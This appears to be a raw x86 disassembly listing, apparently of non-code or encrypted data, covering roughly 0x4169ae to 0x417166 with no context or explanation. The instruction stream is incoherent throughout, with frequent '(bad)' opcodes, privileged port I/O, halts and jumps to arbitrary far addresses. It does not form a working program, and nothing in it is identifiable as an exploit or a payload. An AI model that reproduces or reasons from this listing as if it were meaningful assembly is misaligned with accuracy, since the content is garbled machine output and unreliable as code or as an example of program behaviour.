  4169ae:	jmp    FWORD PTR [ebx]
  4169b0:	pop    eax
  4169b1:	aaa    
  4169b2:	iret   
  4169b3:	mov    edi,0x93285251
  4169b8:	nop
  4169b9:	or     DWORD PTR [ebp+0x3c6c3930],esi
  4169bf:	mov    ebx,0x12f90a63
  4169c4:	out    dx,eax
  4169c5:	js     0x416997
  4169c7:	or     dl,dh
  4169c9:	mov    edi,0x88cbe6a8
  4169ce:	dec    esp
  4169cf:	stc    
  4169d0:	pop    ebx
  4169d1:	fbstp  TBYTE PTR [edi+0x5d]
  4169d4:	add    cl,BYTE PTR [edi+0x0]
  4169d7:	cdq    
  4169d8:	shr    dh,1
  4169da:	mov    bh,0xa4
  4169dc:	fadd   DWORD PTR [esi]
  4169de:	arpl   WORD PTR [ecx],dx
  4169e0:	mov    bl,0x13
  4169e2:	std    
  4169e3:	cli    
  4169e4:	add    edx,DWORD PTR [eax-0x5c89fab3]
  4169ea:	call   0xac7a:0x1101b8d2
  4169f1:	sbb    ch,BYTE PTR [edx]
  4169f3:	jmp    FWORD PTR [ebx]
  4169f5:	jae    0x4169ca
  4169f7:	xchg   esi,eax
  4169f8:	mov    ch,0x3f
  4169fa:	cmp    DWORD PTR [edi-0x6ecf0878],ecx
  416a00:	call   0x91719b66
  416a05:	data16 fsub DWORD PTR [edx]
  416a08:	mov    edx,0x4618a79d
  416a0d:	push   cs
  416a0e:	ret    0xd80b
  416a11:	cld    
  416a12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a13:	xchg   edx,eax
  416a14:	mov    ebp,0x3a0e5376
  416a19:	les    ebp,FWORD PTR [ebp+0x685fdaee]
  416a1f:	test   eax,0xce7e6be
  416a24:	cs xor bh,bh
  416a27:	test   DWORD PTR [eax],ecx
  416a29:	mov    bh,0x59
  416a2b:	test   al,0xcc
  416a2d:	mov    al,ds:0x1f315131
  416a32:	lea    edx,[eax-0x3d]
  416a35:	scas   al,BYTE PTR es:[edi]
  416a36:	stos   BYTE PTR es:[edi],al
  416a37:	test   eax,0x64e5557c
  416a3c:	and    DWORD PTR [edi-0x315706b8],ebp
  416a42:	int3   
  416a43:	xchg   ebp,eax
  416a44:	les    edx,FWORD PTR [esp+edx*1-0x454598d1]
  416a4b:	out    0xee,al
  416a4d:	es daa 
  416a4f:	scas   al,BYTE PTR es:[edi]
  416a50:	mov    ebx,DWORD PTR [ebx-0x6c]
  416a53:	jl     0x416a05
  416a55:	xchg   DWORD PTR [esi+0x6a4d826f],eax
  416a5b:	sar    DWORD PTR [ecx],1
  416a5d:	push   ebx
  416a5e:	mov    edi,0x2ad952ee
  416a63:	ss nop
  416a65:	pop    ebx
  416a66:	lods   eax,DWORD PTR ds:[esi]
  416a67:	scas   al,BYTE PTR es:[edi]
  416a68:	lahf   
  416a69:	sar    edx,1
  416a6b:	int3   
  416a6c:	add    BYTE PTR [bx+si],al
  416a6f:	add    BYTE PTR [eax],al
  416a71:	add    al,ch
  416a73:	xchg   ecx,eax
  416a74:	retf   0xfb3a
  416a77:	jnp    0x416a71
  416a79:	sar    DWORD PTR [edx-0x70c478b],cl
  416a7f:	test   eax,0xe845e81f
  416a84:	add    BYTE PTR [eax],al
  416a86:	repz add al,0x0
  416a89:	add    BYTE PTR [eax],bl
  416a8b:	pop    edi
  416a8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a8d:	fdiv   QWORD PTR ds:0x4b905582
  416a93:	call   ecx
  416a95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a96:	fistp  WORD PTR [ebx-0xc]
  416a99:	retf   
  416a9a:	xchg   ebx,eax
  416a9b:	fsubr  DWORD PTR [ebp-0x43]
  416a9e:	mov    BYTE PTR [ebx+0x2e],bl
  416aa1:	(bad)  
  416aa2:	jg     0x416a6b
  416aa4:	dec    esi
  416aa5:	adc    bh,ch
  416aa7:	fild   WORD PTR [edi]
  416aa9:	ds push 0x1af4929f
  416aaf:	sbb    cl,BYTE PTR [edi+ecx*4]
  416ab2:	outs   dx,BYTE PTR ds:[esi]
  416ab3:	add    bl,al
  416ab5:	mov    ch,0xfe
  416ab7:	xchg   al,dl
  416ab9:	in     eax,0x91
  416abb:	sar    BYTE PTR [esi+0x748e531a],1
  416ac1:	jmp    0xdd99:0x9bdb4f1b
  416ac8:	add    ecx,DWORD PTR [edx+0x31]
  416acb:	loope  0x416a9d
  416acd:	push   cs
  416ace:	rcl    DWORD PTR [ecx+0x7f],1
  416ad1:	rol    BYTE PTR [esi+ecx*4],cl
  416ad4:	mov    edi,DWORD PTR [edx+0x28]
  416ad7:	jge    0x416a99
  416ad9:	hlt    
  416ada:	add    BYTE PTR [ebx],dh
  416adc:	sub    eax,0x5f48bf80
  416ae1:	inc    esi
  416ae2:	repz (bad) 
  416ae4:	cwde   
  416ae5:	and    al,0x78
  416ae7:	ja     0x416abb
  416ae9:	loop   0x416ab8
  416aeb:	fadd   st,st(4)
  416aed:	add    DWORD PTR [edi],edi
  416aef:	adc    bh,BYTE PTR [ebx-0x63]
  416af2:	scas   eax,DWORD PTR es:[edi]
  416af3:	sbb    BYTE PTR [edi+0x6fd32395],bl
  416af9:	ins    DWORD PTR es:[edi],dx
  416afa:	in     al,dx
  416afb:	inc    ecx
  416afc:	inc    ebp
  416afd:	adc    eax,0x6c6ff44c
  416b02:	mov    edi,0x7068d45
  416b07:	cdq    
  416b08:	lahf   
  416b09:	ret    
  416b0a:	mov    bl,0x13
  416b0c:	lods   eax,DWORD PTR ds:[esi]
  416b0d:	push   ds
  416b0e:	popf   
  416b0f:	std    
  416b10:	iret   
  416b11:	xchg   ebx,eax
  416b12:	cdq    
  416b13:	leave  
  416b14:	push   ss
  416b15:	ins    BYTE PTR es:[edi],dx
  416b16:	(bad)  
  416b17:	cli    
  416b18:	(bad)  
  416b1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b1b:	sbb    BYTE PTR [eax],cl
  416b1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b1e:	push   ebp
  416b1f:	push   esp
  416b20:	jns    0x416b33
  416b22:	adc    al,0x90
  416b24:	addr16 or al,0xb8
  416b27:	imul   ebp,DWORD PTR [ecx-0xb],0x200903e3
  416b2e:	popa   
  416b2f:	enter  0x9333,0xe2
  416b33:	jae    0x416b8a
  416b35:	sbb    esi,eax
  416b37:	mov    bl,0x52
  416b39:	lds    esi,FWORD PTR [ebx]
  416b3b:	adc    edi,DWORD PTR [esi]
  416b3d:	dec    edi
  416b3e:	stos   BYTE PTR es:[edi],al
  416b3f:	ficom  WORD PTR [edi+ebp*8-0x7789b116]
  416b46:	mov    BYTE PTR cs:[ecx-0x3e2299ba],dh
  416b4d:	jmp    0xbc9:0xdf1c6a5
  416b54:	or     eax,0x266b6b6a
  416b59:	inc    ebx
  416b5a:	mov    dh,0xc9
  416b5c:	cmp    BYTE PTR [ebx+eax*4+0x63ff3405],0xc3
  416b64:	ret    
  416b65:	xor    ebp,eax
  416b67:	dec    edi
  416b68:	mov    cl,0x1d
  416b6a:	xchg   esi,eax
  416b6b:	sbb    BYTE PTR [ebp+0x7e64b87e],ah
  416b71:	cmp    ch,BYTE PTR [ebx+eiz*4+0x69f18793]
  416b78:	inc    edx
  416b79:	(bad)  
  416b7a:	arpl   bx,sp
  416b7c:	std    
  416b7d:	imul   eax,eax,0x22116d0e
  416b83:	dec    ebx
  416b84:	retf   
  416b85:	loop   0x416bc4
  416b87:	or     al,0xb5
  416b89:	add    dl,al
  416b8b:	repz mov WORD PTR [eax-0x62],gs
  416b8f:	in     eax,dx
  416b90:	std    
  416b91:	pop    esi
  416b92:	xor    edx,ecx
  416b94:	cmc    
  416b95:	in     eax,0x9b
  416b97:	mov    bl,bh
  416b99:	or     esi,DWORD PTR [edx]
  416b9b:	xchg   edx,eax
  416b9c:	xchg   DWORD PTR [ebx],esi
  416b9e:	lods   al,BYTE PTR ds:[esi]
  416b9f:	out    0x6f,al
  416ba1:	mov    WORD PTR [eax+0x13],es
  416ba4:	xchg   DWORD PTR [eax+0x1fcc6286],ebx
  416baa:	jmp    0x12516044
  416baf:	sti    
  416bb0:	push   es
  416bb1:	pop    es
  416bb2:	adc    bh,BYTE PTR [edi]
  416bb4:	jno    0x416b45
  416bb6:	push   0xb8fd26f2
  416bbb:	and    al,0xaf
  416bbd:	pop    ecx
  416bbe:	xor    eax,0xd35cc6af
  416bc3:	shl    edi,1
  416bc5:	mov    ah,0x33
  416bc7:	adc    al,BYTE PTR [ebp-0x14]
  416bca:	push   es
  416bcb:	enter  0x4bb8,0xbe
  416bcf:	imul   eax,DWORD PTR [eax+eax*8-0x36],0x99563492
  416bd7:	inc    edx
  416bd8:	dec    edx
  416bd9:	call   0xb30b:0xe9f3db15
  416be0:	mov    edi,0x96b49062
  416be5:	inc    edi
  416be6:	aad    0xbf
  416be8:	sbb    BYTE PTR [ebx+0x5120bf28],bh
  416bee:	(bad)  
  416bef:	jnp    0x416bd6
  416bf1:	es rcl bh,1
  416bf4:	mov    ebp,0x7d73645
  416bf9:	and    al,0x6f
  416bfb:	jmp    0x5cd58056
  416c00:	mov    eax,0x1eb14775
  416c05:	add    DWORD PTR ds:0x173a42e5,esp
  416c0b:	cmp    BYTE PTR [ebp-0x7f016d9e],cl
  416c11:	add    ch,BYTE PTR [ebp-0x3]
  416c14:	sub    DWORD PTR [eax],ebp
  416c16:	sbb    eax,0xaeac75fb
  416c1b:	mov    al,ds:0xe1f0ccd9
  416c20:	outs   dx,BYTE PTR ds:[esi]
  416c21:	popf   
  416c22:	dec    bh
  416c24:	sbb    eax,0x8854477c
  416c29:	shr    edi,1
  416c2b:	pop    ebx
  416c2c:	ret    0xe4a2
  416c2f:	pop    esp
  416c30:	xor    BYTE PTR [ecx+0x23b65b4f],ch
  416c36:	cdq    
  416c37:	das    
  416c38:	or     ebx,ebp
  416c3a:	adc    DWORD PTR [eax],edx
  416c3c:	rol    edx,cl
  416c3e:	jge    0x416c8a
  416c40:	or     bh,BYTE PTR [ebx+0x769acd7f]
  416c46:	push   esi
  416c47:	leave  
  416c48:	add    edx,DWORD PTR [eax-0x1a0aba97]
  416c4e:	stc    
  416c4f:	cmp    eax,0x364c19f3
  416c54:	(bad)  
  416c58:	stc    
  416c59:	mov    bl,0x5c
  416c5b:	js     0x416cbe
  416c5d:	mov    esp,0x98633574
  416c62:	pop    esi
  416c63:	(bad)  
  416c64:	out    0xcd,eax
  416c66:	push   0x1bf0538b
  416c6b:	xchg   ebp,eax
  416c6c:	mov    al,0x53
  416c6e:	inc    edi
  416c6f:	aam    0xdd
  416c71:	test   eax,0xf81d021e
  416c76:	mov    ebx,0xf102b018
  416c7b:	sub    al,0xc3
  416c7d:	push   0x4639cf5f
  416c82:	pop    ecx
  416c83:	adc    DWORD PTR [edx+0x75782208],edx
  416c89:	mov    bl,0xcd
  416c8b:	or     bh,bh
  416c8d:	dec    eax
  416c8e:	or     BYTE PTR [esi+0x7032a880],dl
  416c94:	push   cs
  416c95:	push   0x6e
  416c97:	loopne 0x416cc5
  416c99:	jno    0x416d01
  416c9b:	adc    BYTE PTR [edi+0x50aef17e],bh
  416ca1:	cld    
  416ca2:	sahf   
  416ca3:	inc    edi
  416ca4:	push   esi
  416ca5:	dec    ebp
  416ca6:	ret    
  416ca7:	xor    BYTE PTR [ecx],al
  416ca9:	sti    
  416caa:	xor    al,0xe5
  416cac:	xchg   esp,eax
  416cad:	xor    al,BYTE PTR [ecx-0x7e]
  416cb0:	push   edx
  416cb1:	or     BYTE PTR [ebp-0x1f2bb183],ah
  416cb7:	xlat   BYTE PTR ds:[ebx]
  416cb8:	repz and al,BYTE PTR [eax+0x5cdd2754]
  416cbf:	out    0x72,eax
  416cc1:	scas   al,BYTE PTR es:[edi]
  416cc2:	jmp    0x7a195b42
  416cc7:	fild   QWORD PTR [edi+0x1f]
  416cca:	jmp    0x29e9:0xeb5ff7e3
  416cd1:	and    al,BYTE PTR [edx]
  416cd3:	sbb    eax,0xa64ffd83
  416cd8:	ss iret 
  416cda:	add    ecx,esi
  416cdc:	xchg   edx,eax
  416cdd:	in     eax,dx
  416cde:	mov    DWORD PTR [edx],esp
  416ce0:	jno    0x416d23
  416ce2:	je     0x416cca
  416ce4:	sbb    BYTE PTR [esi],ah
  416ce6:	or     eax,eax
  416ce8:	shr    ch,1
  416cea:	fbld   TBYTE PTR [esp]
  416ced:	dec    ebp
  416cee:	mov    edi,0xdb19cded
  416cf3:	pushf  
  416cf4:	dec    eax
  416cf5:	lods   al,BYTE PTR ds:[esi]
  416cf6:	fdiv   DWORD PTR [eax-0x69e12d72]
  416cfc:	call   0x4531:0xce291228
  416d03:	push   cs
  416d04:	fisub  DWORD PTR [ecx]
  416d06:	add    DWORD PTR [ecx-0x48ef1d2d],ecx
  416d0c:	mov    bl,0xb9
  416d0e:	pop    DWORD PTR [esi+esi*1+0xf]
  416d12:	mov    eax,0x44082d42
  416d17:	and    BYTE PTR [ecx+0x2],bl
  416d1a:	inc    eax
  416d1b:	xchg   BYTE PTR [eax+0x433a8238],bl
  416d21:	and    DWORD PTR [edi-0x18c0d140],0x2bf76c26
  416d2b:	ficom  WORD PTR [eax-0x1f]
  416d2e:	and    al,0xd3
  416d30:	push   0xffffffcf
  416d32:	loope  0x416dab
  416d34:	shr    BYTE PTR [edi],1
  416d36:	cmp    dh,cl
  416d38:	dec    ebx
  416d39:	xchg   esi,eax
  416d3a:	or     al,0x9a
  416d3c:	jg     0x416dbc
  416d3e:	push   ebp
  416d3f:	stc    
  416d40:	cmp    ebx,ebx
  416d42:	scas   al,BYTE PTR es:[edi]
  416d43:	dec    ebp
  416d44:	xchg   edi,eax
  416d45:	push   edx
  416d46:	enter  0x8225,0xf4
  416d4a:	aad    0x8b
  416d4c:	dec    ebx
  416d4d:	pop    ebx
  416d4e:	fwait
  416d4f:	pop    eax
  416d50:	mov    al,0x13
  416d52:	sti    
  416d53:	sbb    eax,0xae182827
  416d58:	loopne 0x416d3d
  416d5a:	rol    ebx,cl
  416d5c:	jne    0x416d16
  416d5e:	add    al,bh
  416d60:	ficomp WORD PTR [ebp+0x10634451]
  416d66:	mov    ebx,0xeebc6448
  416d6b:	mov    esi,esp
  416d6d:	xchg   BYTE PTR [edi-0x72],al
  416d70:	(bad)  
  416d71:	out    0xdb,al
  416d73:	data16 mov dh,0x80
  416d76:	stc    
  416d77:	es stc 
  416d79:	fmul   DWORD PTR [eax]
  416d7b:	and    eax,0x30fe3db4
  416d80:	or     eax,0x93b4c3c0
  416d85:	repz sbb dl,BYTE PTR [ecx]
  416d88:	dec    esi
  416d89:	test   bl,cl
  416d8b:	ficomp WORD PTR [ebp+edi*4+0x24]
  416d8f:	mov    ecx,0x72837845
  416d94:	ss push ebp
  416d96:	inc    eax
  416d97:	test   DWORD PTR [ecx+0x798c67b8],ebx
  416d9d:	or     BYTE PTR ds:0x18a76658,dl
  416da3:	pusha  
  416da4:	das    
  416da5:	fsubr  st(2),st
  416da7:	jo     0x416dcf
  416da9:	mov    cl,0xd2
  416dab:	(bad)  
  416dac:	pop    ds
  416dad:	test   BYTE PTR [edi+0x24a60254],dl
  416db3:	ins    DWORD PTR es:[edi],dx
  416db4:	fcompp 
  416db6:	iret   
  416db7:	(bad)  
  416db8:	out    0x7,al
  416dba:	push   ecx
  416dbb:	push   esi
  416dbc:	pop    ebx
  416dbd:	add    bh,BYTE PTR [edx]
  416dbf:	pop    ecx
  416dc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416dc1:	dec    esi
  416dc2:	aam    0xba
  416dc4:	jmp    0x47ee5e5c
  416dc9:	int3   
  416dca:	outs   dx,DWORD PTR ds:[esi]
  416dcb:	pop    esp
  416dcc:	enter  0x5a81,0x4f
  416dd0:	fnstenv [edx+ecx*2]
  416dd3:	add    eax,DWORD PTR [esi]
  416dd5:	xchg   BYTE PTR [edi+eiz*2+0x22],dh
  416dd9:	scas   eax,DWORD PTR es:[edi]
  416dda:	xchg   ecx,eax
  416ddb:	mov    ah,0x84
  416ddd:	or     BYTE PTR [esi+0x3e],ch
  416de0:	adc    cl,BYTE PTR [esp+ebp*4+0x6d27985e]
  416de7:	jae    0x416e42
  416de9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416dea:	call   0xa4aa3217
  416def:	das    
  416df0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416df1:	xor    BYTE PTR [ecx+0x78753346],ah
  416df7:	ror    edi,cl
  416df9:	jmp    0x77ea:0xa55a0cab
  416e00:	int3   
  416e01:	adc    eax,0xf44600db
  416e06:	out    dx,al
  416e07:	in     eax,0xc
  416e09:	into   
  416e0a:	xchg   ecx,eax
  416e0b:	lea    edx,[eax+0x5d245e2c]
  416e11:	push   ebx
  416e12:	repnz dec eax
  416e14:	pop    esp
  416e15:	sub    cl,BYTE PTR [ebp+eax*1+0x75]
  416e19:	call   0xf86d6153
  416e1e:	mov    dh,0x77
  416e20:	fwait
  416e21:	lahf   
  416e22:	fsub   DWORD PTR [edi]
  416e24:	loopne 0x416de1
  416e26:	dec    esi
  416e27:	pop    edi
  416e28:	ins    DWORD PTR es:[edi],dx
  416e29:	inc    ecx
  416e2a:	data16 into 
  416e2c:	dec    edi
  416e2d:	mov    esp,0xe33cddf4
  416e32:	dec    edx
  416e33:	pop    ss
  416e34:	retf   0x9335
  416e37:	arpl   WORD PTR [edi],bp
  416e39:	cmp    ebp,DWORD PTR [ebx]
  416e3b:	popa   
  416e3c:	push   ss
  416e3d:	mov    eax,0x577a54b1
  416e42:	jo     0x416eb0
  416e44:	xor    eax,0x8368adb1
  416e49:	or     BYTE PTR [ecx+0x2d],ch
  416e4c:	ins    BYTE PTR es:[edi],dx
  416e4d:	icebp  
  416e4e:	mov    ebp,0xe707a6c1
  416e53:	in     al,0x5e
  416e55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e56:	(bad)  
  416e57:	(bad)  
  416e58:	mov    ebp,0x66fd9de6
  416e5d:	or     eax,0xc70138fc
  416e62:	sub    al,BYTE PTR [edi+0x77821d4e]
  416e68:	adc    cl,ah
  416e6a:	pop    edx
  416e6b:	cmp    ebp,DWORD PTR [ebx+0x11369ebe]
  416e71:	retf   0x260a
  416e74:	ds enter 0xb7fa,0x3f
  416e79:	inc    esi
  416e7a:	xor    eax,0x219d4c59
  416e7f:	xor    eax,0x7da5d8c7
  416e84:	inc    esp
  416e85:	push   cs
  416e86:	adc    BYTE PTR [ebx-0x539dbd48],0x7f
  416e8d:	mov    BYTE PTR [ecx],dl
  416e8f:	out    0x67,eax
  416e91:	addr16 (bad) 
  416e93:	push   eax
  416e94:	popf   
  416e95:	push   0x4a
  416e97:	out    0x8b,eax
  416e99:	sbb    BYTE PTR [edi-0x69],dl
  416e9c:	repnz popa 
  416e9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e9f:	mov    cl,0x8f
  416ea1:	lahf   
  416ea2:	mov    gs,WORD PTR [edi-0x61]
  416ea5:	sbb    esp,DWORD PTR [ebx]
  416ea7:	(bad)  
  416ea8:	push   ecx
  416ea9:	addr16 sahf 
  416eab:	sub    eax,0xd40d7c2b
  416eb0:	and    al,0x70
  416eb2:	mov    ebx,0x42feed8c
  416eb7:	sbb    bh,BYTE PTR [esi]
  416eb9:	jle    0x416efa
  416ebb:	aas    
  416ebc:	imul   ecx,DWORD PTR [edi+edx*4],0x2fd31390
  416ec3:	add    ebx,DWORD PTR [eax-0x3f269dc4]
  416ec9:	cmp    BYTE PTR [ecx-0x74f3def8],dl
  416ecf:	xchg   esp,eax
  416ed0:	add    al,BYTE PTR [edi-0x7a024aaf]
  416ed6:	pop    ebx
  416ed7:	lods   al,BYTE PTR ds:[esi]
  416ed8:	int3   
  416ed9:	inc    esp
  416eda:	xor    ebx,DWORD PTR [edx-0x32]
  416edd:	or     bl,BYTE PTR [ebx+0x3f]
  416ee0:	pop    edx
  416ee1:	(bad)  
  416ee2:	pop    ebx
  416ee3:	cs mov dh,0x3b
  416ee6:	inc    ebx
  416ee7:	int    0x8e
  416ee9:	pop    edx
  416eea:	xor    cl,BYTE PTR [ebp-0x4a]
  416eed:	aaa    
  416eee:	pop    ecx
  416eef:	loop   0x416f54
  416ef1:	sbb    eax,0xa17597e9
  416ef6:	hlt    
  416ef7:	ret    0x8cfd
  416efa:	test   BYTE PTR [ecx+0xb],0x52
  416efe:	lods   al,BYTE PTR ds:[esi]
  416eff:	mov    edi,0xd8afc362
  416f04:	(bad)  
  416f05:	xchg   ebx,eax
  416f06:	inc    edx
  416f07:	jae    0x416ee5
  416f09:	mov    edx,0xa687c292
  416f0e:	mov    al,0x72
  416f10:	clc    
  416f11:	jmp    0xb9276aa3
  416f16:	add    DWORD PTR [edi+0x13182ec5],eax
  416f1c:	dec    ebx
  416f1d:	push   cs
  416f1e:	sub    eax,0x387e85bf
  416f23:	out    dx,eax
  416f24:	adc    DWORD PTR [ebp+0x2d12cc9c],edi
  416f2a:	loop   0x416fa3
  416f2c:	push   esp
  416f2d:	cmp    edi,DWORD PTR [ebx]
  416f2f:	sbb    al,0x63
  416f31:	sub    bl,bl
  416f33:	test   BYTE PTR [edi+ebx*4-0x61],cl
  416f37:	add    al,0x3
  416f39:	sbb    ebp,DWORD PTR [edx+0x21292eb8]
  416f3f:	jge    0x416f46
  416f41:	jecxz  0x416f8a
  416f43:	push   ebx
  416f44:	xor    BYTE PTR [esp+edx*2-0x50b479aa],ah
  416f4b:	jb     0x416f32
  416f4d:	fimul  DWORD PTR [edx-0x42424190]
  416f53:	sbb    cl,BYTE PTR [eax+0x337b956e]
  416f59:	lds    esi,FWORD PTR [eax+eiz*2]
  416f5c:	(bad)  
  416f5d:	push   ss
  416f5e:	push   ebx
  416f5f:	retf   
  416f60:	in     al,0x8a
  416f62:	pop    edi
  416f63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f64:	(bad)  
  416f65:	test   bl,0x55
  416f68:	pop    es
  416f69:	shr    esi,0x55
  416f6c:	mov    ds:0xa5d1531d,eax
  416f71:	jle    0x416ef4
  416f73:	pop    es
  416f74:	push   edx
  416f75:	(bad)  
  416f76:	push   0xffffff8b
  416f78:	call   0x0:0x9d6c58a0
  416f7f:	add    BYTE PTR [eax],al
  416f81:	add    BYTE PTR [ebp+0x2c],dl
  416f84:	pop    edi
  416f85:	test   DWORD PTR [edi-0x9],edi
  416f88:	(bad)  
  416f8a:	adc    dh,BYTE PTR [ecx+0x3e72f626]
  416f90:	and    DWORD PTR [eax+edi*1],edx
  416f93:	in     eax,dx
  416f94:	add    BYTE PTR [eax],al
  416f96:	repz add al,0x0
  416f99:	add    BYTE PTR [ecx+0x4030e73c],ah
  416f9f:	sti    
  416fa0:	jbe    0x416f4c
  416fa2:	sbb    eax,0xd9a5ddff
  416fa7:	jecxz  0x416f4b
  416fa9:	push   0x1a
  416fab:	dec    edi
  416fac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416fad:	shl    DWORD PTR [edx],1
  416faf:	mov    esi,0x845f9480
  416fb4:	shr    BYTE PTR [esi+0x71],0x11
  416fb8:	mov    esi,0xcbcd34d9
  416fbd:	sub    bh,BYTE PTR [ebx]
  416fbf:	sub    esp,edi
  416fc1:	mov    DWORD PTR [ecx+0x544be5c1],esp
  416fc7:	dec    edi
  416fc8:	imul   ebp,DWORD PTR [edi-0x61cb11e5],0x1c
  416fcf:	add    bh,BYTE PTR [edi+0x6cce9b95]
  416fd5:	push   ebp
  416fd6:	sahf   
  416fd7:	add    al,0x53
  416fd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416fda:	scas   al,BYTE PTR es:[edi]
  416fdb:	in     eax,0xe4
  416fdd:	outs   dx,DWORD PTR ds:[esi]
  416fde:	and    BYTE PTR [edi],ah
  416fe0:	sbb    DWORD PTR [eax-0x38],0xfffffff6
  416fe4:	inc    esp
  416fe5:	or     edx,ebp
  416fe7:	dec    edi
  416fe8:	cmp    ch,BYTE PTR [edx+0x53]
  416feb:	(bad)  [eax-0x6b]
  416fee:	test   bh,dl
  416ff0:	out    0x4b,al
  416ff2:	mov    eax,ds:0x3a773237
  416ff7:	push   edx
  416ff8:	mov    eax,0xf2e54a9c
  416ffd:	cmp    BYTE PTR [edi],ah
  416fff:	xor    al,0xb2
  417001:	jl     0x417052
  417003:	add    eax,0x4e141f5c
  417008:	xchg   ecx,eax
  417009:	xchg   ebx,eax
  41700a:	cmp    edx,DWORD PTR [ecx-0x5d]
  41700d:	repz stc 
  41700f:	push   ss
  417010:	jo     0x416fbd
  417012:	jmp    0x768e39f
  417017:	jg     0x417091
  417019:	xchg   ebp,eax
  41701a:	and    al,0xd2
  41701c:	cmp    DWORD PTR [ecx-0x36b7ed1d],esi
  417022:	shl    DWORD PTR [ecx],cl
  417024:	xchg   edx,eax
  417025:	mov    DWORD PTR [edi+0x49],edx
  417028:	test   ch,ah
  41702a:	adc    al,0xa3
  41702c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41702d:	stc    
  41702e:	in     eax,dx
  41702f:	aam    0xd
  417031:	inc    edx
  417032:	xor    DWORD PTR [esi],esp
  417034:	stc    
  417035:	cwde   
  417036:	mov    dh,0x6
  417038:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417039:	push   0xffffffdc
  41703b:	xchg   DWORD PTR [ebx+0x6a],ebp
  41703e:	dec    esi
  41703f:	in     al,dx
  417040:	xlat   BYTE PTR ds:[ebx]
  417041:	in     al,0xdb
  417043:	or     bl,BYTE PTR ds:0x2f4a23ab
  417049:	int3   
  41704a:	sahf   
  41704b:	sbb    esp,0x7f2790e1
  417051:	xchg   DWORD PTR [esi+0x3f1e5332],edi
  417057:	mov    ah,0x38
  417059:	bound  edx,QWORD PTR [ecx]
  41705b:	bound  esp,QWORD PTR ds:0xd5a68365
  417061:	arpl   WORD PTR [ebp-0x4b3b26e0],ax
  417067:	outs   dx,BYTE PTR ds:[esi]
  417068:	fiadd  DWORD PTR [edi+0x4ae09635]
  41706e:	sbb    al,BYTE PTR [edx]
  417070:	jb     0x41702b
  417072:	fmul   DWORD PTR [ecx+0x4cd01c43]
  417078:	fisubr WORD PTR [edx-0x67ec71a8]
  41707e:	jns    0x4170d3
  417080:	ja     0x4170ac
  417082:	out    dx,al
  417083:	sbb    eax,0x8015d2bb
  417088:	lock inc ebx
  41708a:	shl    BYTE PTR [edi+0x2c],cl
  41708d:	js     0x41708e
  41708f:	shl    BYTE PTR [ebp+0x70],0x84
  417093:	mov    BYTE PTR [eax],dl
  417095:	clc    
  417096:	or     bl,BYTE PTR [esi]
  417098:	test   DWORD PTR [esp+ebp*2+0x41],edi
  41709c:	(bad)  
  41709d:	dec    ebx
  41709e:	mov    edi,0x3765f8e5
  4170a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4170a4:	ja     0x41702d
  4170a6:	jmp    0x5fe062b2
  4170ab:	in     eax,0xc6
  4170ad:	sbb    al,BYTE PTR [ebx]
  4170af:	(bad)  
  4170b1:	cli    
  4170b2:	cdq    
  4170b3:	sbb    ebp,DWORD PTR [ecx-0x27]
  4170b6:	push   esi
  4170b7:	add    DWORD PTR [esi-0x37],eax
  4170ba:	mov    ecx,0xc1fc7372
  4170bf:	sbb    edi,DWORD PTR [bx+di-0x31ad]
  4170c4:	push   0x76a19d28
  4170c9:	daa    
  4170ca:	add    eax,0x127ae093
  4170cf:	(bad)  
  4170d0:	rcr    DWORD PTR [ebp+0x1fd25703],cl
  4170d6:	neg    DWORD PTR [eax]
  4170d8:	inc    ecx
  4170d9:	retf   
  4170da:	jp     0x417108
  4170dc:	push   0x939887ac
  4170e1:	int3   
  4170e2:	add    ebp,ecx
  4170e4:	sub    dh,dh
  4170e6:	and    eax,0x9f710cbf
  4170eb:	push   ebp
  4170ec:	xor    DWORD PTR [esi],0x749fb300
  4170f2:	mov    al,ds:0x4fa9daa2
  4170f7:	sub    al,0x3f
  4170f9:	or     ebx,edi
  4170fb:	ficomp WORD PTR [ebx-0x1d]
  4170fe:	pop    ebx
  4170ff:	stos   BYTE PTR es:[edi],al
  417100:	add    ch,cl
  417102:	ret    
  417103:	xchg   edx,eax
  417104:	mov    cl,0x71
  417106:	mov    ch,0x8e
  417108:	fild   QWORD PTR [edi+0x58]
  41710b:	push   0xdb64fbe
  417110:	idiv   DWORD PTR [edi-0x18e63dcf]
  417116:	pusha  
  417117:	xchg   ecx,eax
  417118:	jmp    0xd95358a
  41711d:	push   es
  41711e:	addr16 int3 
  417120:	popf   
  417121:	jo     0x4170ab
  417123:	stc    
  417124:	sar    edi,0x61
  417127:	addr16 xor eax,0x3c63855f
  41712d:	mov    eax,ds:0xe7b12e22
  417132:	mov    edx,0x621a74e2
  417137:	into   
  417138:	lods   eax,DWORD PTR ds:[esi]
  417139:	mov    esi,0xa4d76714
  41713e:	loopne 0x417171
  417140:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417141:	pushf  
  417142:	cs loope 0x41711d
  417145:	push   ss
  417146:	into   
  417147:	retf   
  417148:	push   esi
  417149:	mov    bl,0x57
  41714b:	lods   eax,DWORD PTR ds:[esi]
  41714c:	jg     0x41716f
  41714e:	enter  0x8d98,0xa3
  417152:	pop    edi
  417153:	pop    eax
  417154:	ins    BYTE PTR es:[edi],dx
  417155:	or     ebx,ebx
  417157:	mov    edi,0x18816d16
  41715c:	cwde   
  41715d:	jecxz  0x417170
  41715f:	out    0x6c,eax
  417161:	pop    ebx
  417162:	cwde   
  417163:	out    0x2e,eax
  417165:	into   
  417166:	mov    eax,0x397db6eb
